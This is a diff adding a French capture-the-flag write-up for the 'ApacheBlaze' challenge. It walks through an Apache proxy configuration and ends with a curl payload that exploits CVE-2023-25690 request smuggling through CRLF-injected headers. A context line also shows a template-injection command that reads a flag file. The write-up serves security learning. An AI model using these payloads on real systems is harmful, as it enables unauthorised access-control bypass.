@@ -181,3 +181,65 @@ Exemples de payloads à mettre dans les réponses du webhook pour obtenir le fla
     {{.FetchServerInfo "cat /flag28c66c9c92.txt"}}
 
 Il est important de mettre le point avant la fonction sinon le site plante et retourne une erreur 500.
+
+## ApacheBlaze
+
+On arrive sur un site présentant 4 jeux différents mais qui ne semblent pas disponibles.
+
+Dans le fichier **app.py**, qui constitue l'entièreté du backend, on trouve la condition nécessaire pour obtenir le flag : 
+
+    elif game == 'click_topia':
+        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
+            return jsonify({
+                'message': f'{app.config["FLAG"]}'
+            }), 200
+            
+Dans le fichier **httpd.conf** on observe deux virtual hosts : 
+
+    <VirtualHost *:1337>
+
+        ServerName _
+
+        DocumentRoot /usr/local/apache2/htdocs
+
+        RewriteEngine on
+
+        RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
+        ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"
+
+    </VirtualHost>
+
+    <VirtualHost *:8080>
+
+        ServerName _
+
+        ProxyPass / balancer://mycluster/
+        ProxyPassReverse / balancer://mycluster/
+
+        <Proxy balancer://mycluster>
+            BalancerMember http://127.0.0.1:8081 route=127.0.0.1
+            BalancerMember http://127.0.0.1:8082 route=127.0.0.1
+            ProxySet stickysession=ROUTEID
+            ProxySet lbmethod=byrequests
+        </Proxy>
+
+    </VirtualHost>
+    
+    
+En interceptant une requête avec Burp et en essayant naïvement de modifier le header "X-Forwarded-Host" manuellement, cela ne fonctionne pas :
+
+    X-Forwarded-Host: dev.apacheblaze.local
+
+En essayant avec Curl en mode verbeux et en local, on peut voir que des headers sont rajoutés par le serveur, mais c'est logique puisque c'est le comportement par défaut de mod_proxy_http.
+
+Toutefois, un CVE bien connu sur Apache permet justement de rajouter des headers arbitraires, et semble correspondre à notre cas de figure ("mod_proxy" activé et présence d'une "RewriteRule" bien spécifique).
+
+Voir : 
+
+- https://access.redhat.com/security/cve/cve-2023-25690
+- https://github.com/dhmosfunk/CVE-2023-25690-POC
+
+
+Payload final : 
+
+    curl "83.136.251.235:34303/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/" 
